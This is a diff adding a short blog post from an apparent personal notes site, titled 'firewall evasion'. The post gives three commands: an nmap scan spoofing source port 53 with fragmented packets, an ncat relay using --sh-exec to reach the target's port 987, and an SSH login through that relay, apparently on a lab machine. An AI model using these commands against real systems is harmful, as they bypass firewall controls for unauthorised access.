@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>firewall evasion</title>
+
+        <link rel="stylesheet" href="/css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>firewall evasion</h1>
+    <div class="blog-post-subheader">
+        December 23, 2018
+    </div>
+    <div class="blog-post-content">
+        <p>Firewall source port scan, found port 987 and bind to localhost.<br />
+<pre>
+/usr/bin/nmap 192.168.5.2 -Pn &ndash;source-port=53 -f
+/usr/bin/ncat -l 678 &ndash;sh-exec &ldquo;ncat 192.168.5.2 987 -p 53&rdquo;
+ssh dave@localhost -p 678
+</pre></p>
+
+    </div>
+</section>
+
+    </body>
+</html>
